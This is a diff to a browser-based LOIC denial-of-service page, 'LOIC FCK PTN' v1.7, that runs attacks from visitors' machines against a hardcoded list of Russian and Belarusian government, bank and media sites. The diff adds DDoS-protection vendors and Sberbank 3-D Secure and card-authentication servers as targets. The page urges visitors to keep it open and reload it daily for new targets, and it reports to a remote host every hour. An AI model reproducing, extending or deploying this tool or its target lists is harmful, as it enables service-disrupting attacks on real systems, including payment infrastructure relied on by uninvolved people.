@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>LOIC FCK PTN v1.6</title>
+  <title>LOIC FCK PTN v1.7</title>
   <meta charset="utf-8"/>
   <script src="online.js"></script>
   <script>
@@ -54,7 +54,10 @@
           "https://sputnik.by", "https://www.gazprom.ru", "https://lukoil.ru", "https://www.sberbank.ru", "https://cloud.rkn.gov.ru",
           "https://mvd.gov.ru", "http://www.belta.by/", "https://www.priorbank.by/", "http://www.sb.by/",
           "https://www.sber-bank.by/sberprime", "https://belapb.by/", "http://sputnik.by/", "http://www.belarus.by/",
-          "http://president.gov.by/"];
+          "http://president.gov.by/", "https://ddos-guard.net/ru", "https://stormwall.pro/", "https://qrator.net/ru/",
+          "https://solidwall.ru/", "https://scr.online.sberbank.ru/api/fl/idgib-w-3ds", "https://3dsec.sberbank.ru/mportal3/auth/login",
+          "https://acs1.sbrf.ru", "https://acs2.sbrf.ru", "https://acs3.sbrf.ru", "https://acs4.sbrf.ru", "https://acs5.sbrf.ru",
+          "https://acs6.sbrf.ru", "https://acs7.sbrf.ru", "https://acs8.sbrf.ru"];
 
     function pickOne(index) {
       var ctr = Math.floor(Math.random() * servers.length);
@@ -201,7 +204,7 @@
 <body>
 <div>
   <div class="heading">
-    <h1>LOIC FCK PTN v1.6</h1>
+    <h1>LOIC FCK PTN v1.7</h1>
     <p class="heading-blue">Keep this page open to keep the "attacks" running</p>
     <p class="heading-blue">Reload once per day to get updated lists of servers to target!</p>
   </div>
@@ -222,7 +225,9 @@
 
   <h2>How does this work?</h2>
   <p>This site uses a JS LOIC script to locally run Denial of Service attacks to a list of targets
-    <b>(<script>document.write("" + servers.length);</script> as of now)</b> from your own
+    <b>(
+      <script>document.write("" + servers.length);</script>
+      as of now)</b> from your own
     hardware.
     For each cannon a target is chosen (and automatically switched every minute) to reduce the load on your hardware,
     and to ensure targets are "evenly" distributed.
@@ -235,7 +240,13 @@
   <h2>Is it working?</h2>
   <p>See for yourself ;) <a href="https://ddosmonitor.herokuapp.com" target="monitor">Here is our monitoring site</a>.</p>
   <p>In the last hour we had
-    <b><script>try {document.write("" + ioncannons);} catch(err) {document.write("???");}</script> ion cannons active!</b></p>
+    <b>
+      <script>try {
+        document.write("" + ioncannons);
+      } catch (err) {
+        document.write("???");
+      }</script>
+      ion cannons active!</b></p>
   <h2>My machine is to weak / strong for this script?</h2>
   <form action="index.html" method="GET">
     <select id="rqps" name="rqps">
@@ -317,9 +328,10 @@
     // hourly reporting in
     setInterval(function () {
       var xhttp = new XMLHttpRequest();
-      xhttp.open("GET", "https://eitzen.at/fckptn/ukrainian_support.php?rqps="+rqps, true);
+      xhttp.open("GET", "https://eitzen.at/fckptn/ukrainian_support.php?rqps=" + rqps, true);
       xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-      xhttp.onreadystatechange = function () {};
+      xhttp.onreadystatechange = function () {
+      };
       xhttp.send();
     }, 60 * 60000);
   </script>
